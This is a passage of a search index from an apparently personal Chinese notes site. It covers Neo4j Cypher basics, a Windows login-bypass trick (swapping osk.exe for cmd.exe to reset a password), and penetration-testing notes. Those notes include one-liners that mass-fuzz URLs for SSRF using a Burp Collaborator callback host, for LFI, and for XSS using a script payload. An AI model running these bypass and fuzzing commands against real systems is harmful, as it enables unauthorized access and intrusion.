<node-name>:<label-name> { <Property1-name>:<Property1-Value> ........ <Propertyn-name>:<Propertyn-Value> } ) : : \u952e\u503c\u5bf9\uff0cname\u4e3a\u5c5e\u6027\u540d\uff0cvalue\u4e3a\u5c5e\u6027\u503c \u800cMERGE\u548cCREATE\u662f\u5dee\u4e0d\u591a\u7684\uff0c\u552f\u4e00\u533a\u522b\u662fMERGE\u5728\u63d2\u5165\u65b0\u7684\u8282\u70b9\uff0c\u5c5e\u6027\u6216\u5173\u7cfb\u65f6\u4f1a\u5148\u68c0\u7d22\u6570\u636e\u5e93\uff0c\u82e5\u6dfb\u52a0\u5230\u662f\u91cd\u590d\u9879\u5219\u4e0d\u4f1a\u6dfb\u52a0\uff0c\u4e0d\u91cd\u590d\u624d\u4f1a\u6dfb\u52a0\u3002 \u5177\u4f53\u8bed\u6cd5\u4e0eCREATE\u4e00\u81f4 MERGE ( <node-name>:<label-name> { <Property1-name>:<Property1-Value> ........ <Propertyn-name>:<Propertyn-Value> } ) SET SET\u7528\u4e8e\u6dfb\u52a0\u65b0\u5c5e\u6027 \u5e38\u7528\uff1aMATCH (test:TestDB) SET test.age=10 return TestDB MATCH\\&RETURN \u4ece\u6570\u636e\u5e93\u83b7\u5f97\u8282\u70b9\uff0c\u5173\u7cfb\uff0c\u5c5e\u6027\u7684\u6570\u636e MATCH ( <node-name>:<label-name> ) return <node-name>.<propertyn-name> \u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0cMATCH\u548cRETURN\u51fd\u6570\u4e0d\u80fd\u5355\u72ec\u4f7f\u7528\uff0c\u5e38\u914d\u5408\u4f7f\u7528\uff0c\u5982\u3002 MATCH(dept:Dept) return dept //\u67e5\u8be2Dept\u4e0b\u7684\u5185\u5bb9 MATCH(dept:Dept) return dept.location //\u67e5\u8be2Dept\u4e0b\u7684\u6240\u6709location\u5c5e\u6027 # \u67e5\u8be2Employee\u6807\u7b7e\u4e0b id=123\uff0cname=\"Lokesh\"\u7684\u8282\u70b9 MATCH (p:Employee {id:123,name:\"Lokesh\"}) RETURN p \u5173\u7cfb Neo4j\u7684\u8282\u70b9\u95f4\u6709\u4e24\u79cd\u5173\u7cfb\uff1a\u5355\u5411\u5173\u7cfb\u4e0e\u53cc\u5411\u5173\u7cfb\u3002\u5176\u88ab\u7528\u4f5c\u6765\u63cf\u8ff0\u8282\u70b9\u4e0e\u8282\u70b9\u4e4b\u95f4\u7684\u5173\u7cfb CREATE (<node1-name>:<label1-name>)- [<relationship-name>:<relationship-label-name>] ->(<node2-name>:<label2-name>) \u521b\u5efa\u65b0\u8282\u70b9\u4e0e\u65b0\u5173\u7cfb MATCH (a:Chinese),(b:Dog) where a.name=\"Yangfan\" AND b.name=\"ergu\" create (a)-[r:Relationship{ref:\"Leader\"}]->(b) return r \u4ece\u73b0\u6709\u8282\u70b9\u521b\u5efa\u5173\u7cfb WHERE \u548cMYSQL\u7684where\u8bed\u53e5\u5f88\u7c7b\u4f3c\uff0c\u5373MATCH\u67e5\u8be2\u7684\u9650\u5236\u51fd\u6570 WHERE <property-name> <comparison-operator> <value> \u7b80\u5355\u7684WHERE\u5b50\u53e5 \u5b83\u662f\u8282\u70b9\u6216\u5173\u7cfb\u7684\u5c5e\u6027\u540d\u79f0\u3002 \u6bd4\u8f83\u8fd0\u7b97\u7b26 \u503c DELETE\\&REMOVE DELETE\u7528\u4e8e\u5220\u9664\u8282\u70b9\u6216\u5173\u7cfb \u5e38\u7528\uff1a MATCH(e:Employee) DELETE e REMOVE\u7528\u4e8e\u5220\u9664\u5c5e\u6027 \u5e38\u7528\uff1aMATCH (book { id:122 }) REMOVE book.price","title":"\u5165\u95e8neo4j\u6570\u636e\u5e93"},{"location":"%E5%BC%80%E5%8F%91%E3%80%81%E4%B8%9A%E5%8A%A1%E5%AD%A6%E4%B9%A0%E5%8C%BA/%E5%BC%80%E5%8F%91/%E5%85%A5%E9%97%A8neo4j%E6%95%B0%E6%8D%AE%E5%BA%93/%E5%85%A5%E9%97%A8neo4j%E6%95%B0%E6%8D%AE%E5%BA%93/#neo4j","text":"","title":"\u5165\u95e8neo4j\u6570\u636e\u5e93"},{"location":"%E5%BC%80%E5%8F%91%E3%80%81%E4%B8%9A%E5%8A%A1%E5%AD%A6%E4%B9%A0%E5%8C%BA/%E5%BC%80%E5%8F%91/%E5%85%A5%E9%97%A8neo4j%E6%95%B0%E6%8D%AE%E5%BA%93/%E5%85%A5%E9%97%A8neo4j%E6%95%B0%E6%8D%AE%E5%BA%93/#_1","text":"","title":"\u7b80\u4ecb"},{"location":"%E5%BC%80%E5%8F%91%E3%80%81%E4%B8%9A%E5%8A%A1%E5%AD%A6%E4%B9%A0%E5%8C%BA/%E5%BC%80%E5%8F%91/%E5%85%A5%E9%97%A8neo4j%E6%95%B0%E6%8D%AE%E5%BA%93/%E5%85%A5%E9%97%A8neo4j%E6%95%B0%E6%8D%AE%E5%BA%93/#rdbms-gdbms","text":"RDBMS \u662f\u4ee5 \u8868\u3001\u884c\u3001\u5217\u5b58\u50a8\u6570\u636e\u7684\u6570\u636e\u5e93\uff1bGDBMS\u662f\u4ee5\u56fe\u5f62\u5b58\u50a8\u7684\u6570\u636e\u5e93\u3002 neo4j\u5c31\u662f\u56fe\u6570\u636e\u5e93\uff0cGDBMS\u7684\u4e00\u79cd\u3002\u5b83\u5f88\u9002\u7528\u4e8e\u904d\u5386\u5927\u91cf\u6570\u636e\u3002","title":"RDBMS \u4e0e GDBMS"},{"location":"%E5%BC%80%E5%8F%91%E3%80%81%E4%B8%9A%E5%8A%A1%E5%AD%A6%E4%B9%A0%E5%8C%BA/%E5%BC%80%E5%8F%91/%E5%85%A5%E9%97%A8neo4j%E6%95%B0%E6%8D%AE%E5%BA%93/%E5%85%A5%E9%97%A8neo4j%E6%95%B0%E6%8D%AE%E5%BA%93/#_2","text":"\u5c5e\u6027\u56fe\u6a21\u578b\u89c4\u5219 \u8868\u793a\u8282\u70b9\uff0c\u5173\u7cfb\u548c\u5c5e\u6027\u4e2d\u7684\u6570\u636e \u8282\u70b9\u548c\u5173\u7cfb\u90fd\u5305\u542b\u5c5e\u6027 \u5173\u7cfb\u8fde\u63a5\u8282\u70b9 \u5c5e\u6027\u662f\u952e\u503c\u5bf9 \u8282\u70b9\u7528\u5706\u5708\u8868\u793a\uff0c\u5173\u7cfb\u7528\u65b9\u5411\u952e\u8868\u793a\u3002 \u5173\u7cfb\u5177\u6709\u65b9\u5411\uff1a\u5355\u5411\u548c\u53cc\u5411\u3002 \u6bcf\u4e2a\u5173\u7cfb\u5305\u542b\u201c\u5f00\u59cb\u8282\u70b9\u201d\u6216\u201c\u4ece\u8282\u70b9\u201d\u548c\u201c\u5230\u8282\u70b9\u201d\u6216\u201c\u7ed3\u675f\u8282\u70b9\u201d \u6bcf\u4e2a\u5173\u7cfb\u90fd\u662f\u5b9a\u5411\u7684\uff0c\u82e5\u6ca1\u6709\u65b9\u5411\u5219\u4f1a\u629b\u51fa\u9519\u8bef \u56fe\u5f62\u6570\u636e\u5e93\u6570\u636e\u6a21\u578b\u662f\u7531\uff1a\u8282\u70b9\uff0c\u5173\u7cfb\uff0c\u5c5e\u6027\u6784\u6210\u7684\uff0c\u5c31\u50cf\u8fd9\u6837","title":"\u6570\u636e\u6a21\u578b"},{"location":"%E5%BC%80%E5%8F%91%E3%80%81%E4%B8%9A%E5%8A%A1%E5%AD%A6%E4%B9%A0%E5%8C%BA/%E5%BC%80%E5%8F%91/%E5%85%A5%E9%97%A8neo4j%E6%95%B0%E6%8D%AE%E5%BA%93/%E5%85%A5%E9%97%A8neo4j%E6%95%B0%E6%8D%AE%E5%BA%93/#cql","text":"CQL\u662fCypher\u67e5\u8be2\u8bed\u8a00\uff0cNeo4j\u9009\u7528CQL\u4f5c\u4e3a\u67e5\u8be2\u8bed\u8a00","title":"CQL"},{"location":"%E5%BC%80%E5%8F%91%E3%80%81%E4%B8%9A%E5%8A%A1%E5%AD%A6%E4%B9%A0%E5%8C%BA/%E5%BC%80%E5%8F%91/%E5%85%A5%E9%97%A8neo4j%E6%95%B0%E6%8D%AE%E5%BA%93/%E5%85%A5%E9%97%A8neo4j%E6%95%B0%E6%8D%AE%E5%BA%93/#cql_1","text":"","title":"CQL \u6570\u636e\u7c7b\u578b"},{"location":"%E5%BC%80%E5%8F%91%E3%80%81%E4%B8%9A%E5%8A%A1%E5%AD%A6%E4%B9%A0%E5%8C%BA/%E5%BC%80%E5%8F%91/%E5%85%A5%E9%97%A8neo4j%E6%95%B0%E6%8D%AE%E5%BA%93/%E5%85%A5%E9%97%A8neo4j%E6%95%B0%E6%8D%AE%E5%BA%93/#createmerge","text":"CREATE \u7528\u4e8e\u521b\u5efa\u8282\u70b9\uff0c\u5173\u7cfb\uff0c\u4ee5\u53ca\u4e3a\u8282\u70b9\u6216\u5173\u7cfb\u6dfb\u52a0\u6807\u7b7e \u521b\u5efa\u65e0\u5c5e\u6027\u8282\u70b9\uff1aCREATE (<node-name>:<label-name>) CREATE (<node-name>:<label-name1>:<label-name2>.....:<label-namen>) \u521b\u5efa\u591a\u4e2a\u6807\u7b7e\u5230\u8282\u70b9 node-name : \u8282\u70b9\u540d lable-name: \u6807\u7b7e\u540d\uff0c\u6211\u4eec\u4e00\u822c\u7528\u6807\u7b7e\u540d\u6765\u8bbf\u95ee\u67d0\u4e2a\u8282\u70b9\u7684\u8be6\u7ec6\u4fe1\u606f \u521b\u5efa\u6709\u5c5e\u6027\u8282\u70b9\uff1a CREATE ( <node-name>:<label-name> { <Property1-name>:<Property1-Value> ........ <Propertyn-name>:<Propertyn-Value> } ) : : \u952e\u503c\u5bf9\uff0cname\u4e3a\u5c5e\u6027\u540d\uff0cvalue\u4e3a\u5c5e\u6027\u503c \u800cMERGE\u548cCREATE\u662f\u5dee\u4e0d\u591a\u7684\uff0c\u552f\u4e00\u533a\u522b\u662fMERGE\u5728\u63d2\u5165\u65b0\u7684\u8282\u70b9\uff0c\u5c5e\u6027\u6216\u5173\u7cfb\u65f6\u4f1a\u5148\u68c0\u7d22\u6570\u636e\u5e93\uff0c\u82e5\u6dfb\u52a0\u5230\u662f\u91cd\u590d\u9879\u5219\u4e0d\u4f1a\u6dfb\u52a0\uff0c\u4e0d\u91cd\u590d\u624d\u4f1a\u6dfb\u52a0\u3002 \u5177\u4f53\u8bed\u6cd5\u4e0eCREATE\u4e00\u81f4 MERGE ( <node-name>:<label-name> { <Property1-name>:<Property1-Value> ........ <Propertyn-name>:<Propertyn-Value> } )","title":"CREATE\\&amp;MERGE"},{"location":"%E5%BC%80%E5%8F%91%E3%80%81%E4%B8%9A%E5%8A%A1%E5%AD%A6%E4%B9%A0%E5%8C%BA/%E5%BC%80%E5%8F%91/%E5%85%A5%E9%97%A8neo4j%E6%95%B0%E6%8D%AE%E5%BA%93/%E5%85%A5%E9%97%A8neo4j%E6%95%B0%E6%8D%AE%E5%BA%93/#set","text":"SET\u7528\u4e8e\u6dfb\u52a0\u65b0\u5c5e\u6027 \u5e38\u7528\uff1aMATCH (test:TestDB) SET test.age=10 return TestDB","title":"SET"},{"location":"%E5%BC%80%E5%8F%91%E3%80%81%E4%B8%9A%E5%8A%A1%E5%AD%A6%E4%B9%A0%E5%8C%BA/%E5%BC%80%E5%8F%91/%E5%85%A5%E9%97%A8neo4j%E6%95%B0%E6%8D%AE%E5%BA%93/%E5%85%A5%E9%97%A8neo4j%E6%95%B0%E6%8D%AE%E5%BA%93/#matchreturn","text":"\u4ece\u6570\u636e\u5e93\u83b7\u5f97\u8282\u70b9\uff0c\u5173\u7cfb\uff0c\u5c5e\u6027\u7684\u6570\u636e MATCH ( <node-name>:<label-name> ) return <node-name>.<propertyn-name> \u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0cMATCH\u548cRETURN\u51fd\u6570\u4e0d\u80fd\u5355\u72ec\u4f7f\u7528\uff0c\u5e38\u914d\u5408\u4f7f\u7528\uff0c\u5982\u3002 MATCH(dept:Dept) return dept //\u67e5\u8be2Dept\u4e0b\u7684\u5185\u5bb9 MATCH(dept:Dept) return dept.location //\u67e5\u8be2Dept\u4e0b\u7684\u6240\u6709location\u5c5e\u6027 # \u67e5\u8be2Employee\u6807\u7b7e\u4e0b id=123\uff0cname=\"Lokesh\"\u7684\u8282\u70b9 MATCH (p:Employee {id:123,name:\"Lokesh\"}) RETURN p","title":"MATCH\\&amp;RETURN"},{"location":"%E5%BC%80%E5%8F%91%E3%80%81%E4%B8%9A%E5%8A%A1%E5%AD%A6%E4%B9%A0%E5%8C%BA/%E5%BC%80%E5%8F%91/%E5%85%A5%E9%97%A8neo4j%E6%95%B0%E6%8D%AE%E5%BA%93/%E5%85%A5%E9%97%A8neo4j%E6%95%B0%E6%8D%AE%E5%BA%93/#_3","text":"Neo4j\u7684\u8282\u70b9\u95f4\u6709\u4e24\u79cd\u5173\u7cfb\uff1a\u5355\u5411\u5173\u7cfb\u4e0e\u53cc\u5411\u5173\u7cfb\u3002\u5176\u88ab\u7528\u4f5c\u6765\u63cf\u8ff0\u8282\u70b9\u4e0e\u8282\u70b9\u4e4b\u95f4\u7684\u5173\u7cfb CREATE (<node1-name>:<label1-name>)- [<relationship-name>:<relationship-label-name>] ->(<node2-name>:<label2-name>) \u521b\u5efa\u65b0\u8282\u70b9\u4e0e\u65b0\u5173\u7cfb MATCH (a:Chinese),(b:Dog) where a.name=\"Yangfan\" AND b.name=\"ergu\" create (a)-[r:Relationship{ref:\"Leader\"}]->(b) return r \u4ece\u73b0\u6709\u8282\u70b9\u521b\u5efa\u5173\u7cfb","title":"\u5173\u7cfb"},{"location":"%E5%BC%80%E5%8F%91%E3%80%81%E4%B8%9A%E5%8A%A1%E5%AD%A6%E4%B9%A0%E5%8C%BA/%E5%BC%80%E5%8F%91/%E5%85%A5%E9%97%A8neo4j%E6%95%B0%E6%8D%AE%E5%BA%93/%E5%85%A5%E9%97%A8neo4j%E6%95%B0%E6%8D%AE%E5%BA%93/#where","text":"\u548cMYSQL\u7684where\u8bed\u53e5\u5f88\u7c7b\u4f3c\uff0c\u5373MATCH\u67e5\u8be2\u7684\u9650\u5236\u51fd\u6570 WHERE <property-name> <comparison-operator> <value> \u7b80\u5355\u7684WHERE\u5b50\u53e5 \u5b83\u662f\u8282\u70b9\u6216\u5173\u7cfb\u7684\u5c5e\u6027\u540d\u79f0\u3002 \u6bd4\u8f83\u8fd0\u7b97\u7b26 \u503c","title":"WHERE"},{"location":"%E5%BC%80%E5%8F%91%E3%80%81%E4%B8%9A%E5%8A%A1%E5%AD%A6%E4%B9%A0%E5%8C%BA/%E5%BC%80%E5%8F%91/%E5%85%A5%E9%97%A8neo4j%E6%95%B0%E6%8D%AE%E5%BA%93/%E5%85%A5%E9%97%A8neo4j%E6%95%B0%E6%8D%AE%E5%BA%93/#deleteremove","text":"DELETE\u7528\u4e8e\u5220\u9664\u8282\u70b9\u6216\u5173\u7cfb \u5e38\u7528\uff1a MATCH(e:Employee) DELETE e REMOVE\u7528\u4e8e\u5220\u9664\u5c5e\u6027 \u5e38\u7528\uff1aMATCH (book { id:122 }) REMOVE book.price","title":"DELETE\\&amp;REMOVE"},{"location":"%E5%BC%80%E5%8F%91%E3%80%81%E4%B8%9A%E5%8A%A1%E5%AD%A6%E4%B9%A0%E5%8C%BA/%E6%9D%82%E6%8A%80/%E6%9D%82%E6%8A%80/","text":"\u6742\u6280 \u5f3a\u5236\u6539windows\u5bc6\u7801","title":"\u6742\u6280"},{"location":"%E5%BC%80%E5%8F%91%E3%80%81%E4%B8%9A%E5%8A%A1%E5%AD%A6%E4%B9%A0%E5%8C%BA/%E6%9D%82%E6%8A%80/%E6%9D%82%E6%8A%80/#_1","text":"\u5f3a\u5236\u6539windows\u5bc6\u7801","title":"\u6742\u6280"},{"location":"%E5%BC%80%E5%8F%91%E3%80%81%E4%B8%9A%E5%8A%A1%E5%AD%A6%E4%B9%A0%E5%8C%BA/%E6%9D%82%E6%8A%80/%E5%BC%BA%E5%88%B6%E6%94%B9windows%E5%AF%86%E7%A0%81/%E5%BC%BA%E5%88%B6%E6%94%B9windows%E5%AF%86%E7%A0%81/","text":"\u5f3a\u5236\u6539windows\u5bc6\u7801 \u4e0d\u77e5\u9053windows\u5bc6\u7801\u7684\u524d\u63d0\u4e0b\uff0c\u76f4\u63a5\u6539windows\u5bc6\u7801\u5b9e\u73b0\u767b\u5f55\u3002 \u5f04\u4e00\u4e2ape \u542f\u52a8u\u76d8\uff0c\u7136\u540eu\u76d8\u542f\u52a8\uff0c\u6309shift+f10\u8fdb\u5165cmd shell\u3002 \u7136\u540e\u8fdb\u5165c:\\windows\\system32 copy osk.exe osk2.exe \u628a\u5c4f\u5e55\u952e\u76d8\u7a0b\u5e8f\u5907\u4efd copy cmd.exe osk.exe \u628a\u5c4f\u5e55\u952e\u76d8\u8986\u76d6 \u91cd\u542f\uff0c\u6765\u5230\u767b\u5f55\u9875\uff0c\u8f7b\u677e\u8bbf\u95ee\u2192\u5c4f\u5e55\u952e\u76d8\u547c\u51facmd net user admin 123456 123456 \uff08\u4f46\u53ef\u80fd\u88abdefender\u6740\uff09","title":"\u5f3a\u5236\u6539windows\u5bc6\u7801"},{"location":"%E5%BC%80%E5%8F%91%E3%80%81%E4%B8%9A%E5%8A%A1%E5%AD%A6%E4%B9%A0%E5%8C%BA/%E6%9D%82%E6%8A%80/%E5%BC%BA%E5%88%B6%E6%94%B9windows%E5%AF%86%E7%A0%81/%E5%BC%BA%E5%88%B6%E6%94%B9windows%E5%AF%86%E7%A0%81/#windows","text":"\u4e0d\u77e5\u9053windows\u5bc6\u7801\u7684\u524d\u63d0\u4e0b\uff0c\u76f4\u63a5\u6539windows\u5bc6\u7801\u5b9e\u73b0\u767b\u5f55\u3002 \u5f04\u4e00\u4e2ape \u542f\u52a8u\u76d8\uff0c\u7136\u540eu\u76d8\u542f\u52a8\uff0c\u6309shift+f10\u8fdb\u5165cmd shell\u3002 \u7136\u540e\u8fdb\u5165c:\\windows\\system32 copy osk.exe osk2.exe \u628a\u5c4f\u5e55\u952e\u76d8\u7a0b\u5e8f\u5907\u4efd copy cmd.exe osk.exe \u628a\u5c4f\u5e55\u952e\u76d8\u8986\u76d6 \u91cd\u542f\uff0c\u6765\u5230\u767b\u5f55\u9875\uff0c\u8f7b\u677e\u8bbf\u95ee\u2192\u5c4f\u5e55\u952e\u76d8\u547c\u51facmd net user admin 123456 123456 \uff08\u4f46\u53ef\u80fd\u88abdefender\u6740\uff09","title":"\u5f3a\u5236\u6539windows\u5bc6\u7801"},{"location":"%E5%BC%80%E5%8F%91%E3%80%81%E4%B8%9A%E5%8A%A1%E5%AD%A6%E4%B9%A0%E5%8C%BA/%E9%A9%BE%E9%A9%ADmac/%E9%A9%BE%E9%A9%ADmac/","text":"\u9a7e\u9a6dmac excel\u4e71\u7801","title":"\u9a7e\u9a6dmac"},{"location":"%E5%BC%80%E5%8F%91%E3%80%81%E4%B8%9A%E5%8A%A1%E5%AD%A6%E4%B9%A0%E5%8C%BA/%E9%A9%BE%E9%A9%ADmac/%E9%A9%BE%E9%A9%ADmac/#mac","text":"excel\u4e71\u7801","title":"\u9a7e\u9a6dmac"},{"location":"%E5%BC%80%E5%8F%91%E3%80%81%E4%B8%9A%E5%8A%A1%E5%AD%A6%E4%B9%A0%E5%8C%BA/%E9%A9%BE%E9%A9%ADmac/excel%E4%B9%B1%E7%A0%81/excel%E4%B9%B1%E7%A0%81/","text":"excel\u4e71\u7801 numbers\u6253\u5f00\u7136\u540e\u5bfc\u51fa\u4e3aexcel","title":"excel\u4e71\u7801"},{"location":"%E5%BC%80%E5%8F%91%E3%80%81%E4%B8%9A%E5%8A%A1%E5%AD%A6%E4%B9%A0%E5%8C%BA/%E9%A9%BE%E9%A9%ADmac/excel%E4%B9%B1%E7%A0%81/excel%E4%B9%B1%E7%A0%81/#excel","text":"numbers\u6253\u5f00\u7136\u540e\u5bfc\u51fa\u4e3aexcel","title":"excel\u4e71\u7801"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F/","text":"\u6e17\u900f \u8106\u5f31\u5e94\u7528 \u5de5\u5177\u6c89\u6dc0 \u6e17\u900f\u8def\u5f84&\u6c89\u6dc0","title":"\u6e17\u900f"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F/#_1","text":"\u8106\u5f31\u5e94\u7528 \u5de5\u5177\u6c89\u6dc0 \u6e17\u900f\u8def\u5f84&\u6c89\u6dc0","title":"\u6e17\u900f"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/","text":"\u5de5\u5177\u6c89\u6dc0 \u7814\u7a76 \u5de5\u5177\u79ef\u7d2f hvv\u5de5\u5177sheet","title":"\u5de5\u5177\u6c89\u6dc0"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/#_1","text":"\u7814\u7a76 \u5de5\u5177\u79ef\u7d2f hvv\u5de5\u5177sheet","title":"\u5de5\u5177\u6c89\u6dc0"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/hvv%E5%B7%A5%E5%85%B7sheet/hvv%E5%B7%A5%E5%85%B7sheet/","text":"hvv\u5de5\u5177sheet \u5b8c\u5168vmware \u865a\u62df\u673a\u4e2d\u8fdb\u884c\uff0c env python3. (pycharm) java1.8. (idea) vscode (visual studio\uff0c\u4e3b\u8981\u7528\u6765\u7f16\u8bd1) bandzip \u57fa\u7840\u8bbe\u65bd cs. \u5b8c\u6210\u63d2\u4ef6\u5b89\u88c5 burp \u5b8c\u6210\u8bc1\u4e66\u5b89\u88c5\uff0c\u63d2\u4ef6\u5b89\u88c5 chrome \u5b8c\u6210\u63d2\u4ef6\u5b89\u88c5 clash proxifier \u5de5\u5177","title":"hvv\u5de5\u5177sheet"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/hvv%E5%B7%A5%E5%85%B7sheet/hvv%E5%B7%A5%E5%85%B7sheet/#hvvsheet","text":"\u5b8c\u5168vmware \u865a\u62df\u673a\u4e2d\u8fdb\u884c\uff0c env python3. (pycharm) java1.8. (idea) vscode (visual studio\uff0c\u4e3b\u8981\u7528\u6765\u7f16\u8bd1) bandzip \u57fa\u7840\u8bbe\u65bd cs. \u5b8c\u6210\u63d2\u4ef6\u5b89\u88c5 burp \u5b8c\u6210\u8bc1\u4e66\u5b89\u88c5\uff0c\u63d2\u4ef6\u5b89\u88c5 chrome \u5b8c\u6210\u63d2\u4ef6\u5b89\u88c5 clash proxifier \u5de5\u5177","title":"hvv\u5de5\u5177sheet"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/","text":"\u5de5\u5177\u79ef\u7d2f \u6293\u5305 \u4ee3\u7406 \u4fe1\u606f\u641c\u96c6&\u6f0f\u626b WebShell \u63d0\u6743 \u5404\u5de5\u5177\u63d2\u4ef6 \u514d\u6740 \u5185\u7f51\u5de5\u5177 \u79fb\u52a8\u7aef \u65b0\u9875\u9762 FUZZ \u7206\u7834","title":"\u5de5\u5177\u79ef\u7d2f"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/#_1","text":"\u6293\u5305 \u4ee3\u7406 \u4fe1\u606f\u641c\u96c6&\u6f0f\u626b WebShell \u63d0\u6743 \u5404\u5de5\u5177\u63d2\u4ef6 \u514d\u6740 \u5185\u7f51\u5de5\u5177 \u79fb\u52a8\u7aef \u65b0\u9875\u9762 FUZZ \u7206\u7834","title":"\u5de5\u5177\u79ef\u7d2f"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/FUZZ/FUZZ/","text":"FUZZ \u76ee\u5f55 tool gau qsreplace ffuf gf HTTPX FUZZ ssrf FUZZ LFI FUZZ xss tool gau \u4ece\u5404\u4e2a\u7f51\u7ad9\u627e\u57df\u540d\u7684url qsreplace \u5c06\u4e00\u4e2aurl\u91cc\u7684\u6240\u6709\u53c2\u6570\u66ff\u6362\u4e3a\u4e00\u4e2a\u56fa\u5b9a\u503c ffuf \u7efc\u5408fuzz\u5de5\u5177 gf https://github.com/1ndianl33t/Gf-Patterns \u4e00\u4e2a\u5f3a\u5927\u7684\u5339\u914d\u5de5\u5177\uff0cgrep plus\u3002 \u53ef\u4ee5\u901a\u8fc7gf xss\u7b49\u547d\u4ee4\u5feb\u901f\u5339\u914d\u4e0exss\u76f8\u5173\u7684\u4e1c\u897f HTTPX \u63a2\u6d3b+\u6307\u7eb9 FUZZ ssrf findomain -t example.com -q | httpx -silent -threads 1000 | gau | grep \u201c=\u201d | qsreplace http://YOUR.burpcollaborator.net FUZZ LFI findomain -t example.com -q | waybackurls |gf lfi | qsreplace FUZZ | while read url ; do ffuf -u $url -mr \u201croot:x\u201d -w ~/wordlist/LFI.txt ; done FUZZ xss cat file.txt | gf xss | grep \u2018source=\u2019 | qsreplace \u2018\u201d><script>confirm(1)</script>\u2019 | while read host do ; do curl \u2013silent \u2013path-as-is \u2013insecure \u201c$host\u201d | grep -qs \u201c<script>confirm(1)\u201d && echo \u201c$host 33[0;31mVulnerablen\u201d;done","title":"FUZZ"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/FUZZ/FUZZ/#fuzz","text":"","title":"FUZZ"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/FUZZ/FUZZ/#_1","text":"tool gau qsreplace ffuf gf HTTPX FUZZ ssrf FUZZ LFI FUZZ xss","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/FUZZ/FUZZ/#tool","text":"","title":"tool"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/FUZZ/FUZZ/#gau","text":"\u4ece\u5404\u4e2a\u7f51\u7ad9\u627e\u57df\u540d\u7684url","title":"gau"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/FUZZ/FUZZ/#qsreplace","text":"\u5c06\u4e00\u4e2aurl\u91cc\u7684\u6240\u6709\u53c2\u6570\u66ff\u6362\u4e3a\u4e00\u4e2a\u56fa\u5b9a\u503c","title":"qsreplace"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/FUZZ/FUZZ/#ffuf","text":"\u7efc\u5408fuzz\u5de5\u5177","title":"ffuf"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/FUZZ/FUZZ/#gf","text":"https://github.com/1ndianl33t/Gf-Patterns \u4e00\u4e2a\u5f3a\u5927\u7684\u5339\u914d\u5de5\u5177\uff0cgrep plus\u3002 \u53ef\u4ee5\u901a\u8fc7gf xss\u7b49\u547d\u4ee4\u5feb\u901f\u5339\u914d\u4e0exss\u76f8\u5173\u7684\u4e1c\u897f","title":"gf"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/FUZZ/FUZZ/#httpx","text":"\u63a2\u6d3b+\u6307\u7eb9","title":"HTTPX"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/FUZZ/FUZZ/#fuzz-ssrf","text":"findomain -t example.com -q | httpx -silent -threads 1000 | gau | grep \u201c=\u201d | qsreplace http://YOUR.burpcollaborator.net","title":"FUZZ ssrf"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/FUZZ/FUZZ/#fuzz-lfi","text":"findomain -t example.com -q | waybackurls |gf lfi | qsreplace FUZZ | while read url ; do ffuf -u $url -mr \u201croot:x\u201d -w ~/wordlist/LFI.txt ; done","title":"FUZZ LFI"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/FUZZ/FUZZ/#fuzz-xss","text":"cat file.txt | gf xss | grep \u2018source=\u2019 | qsreplace 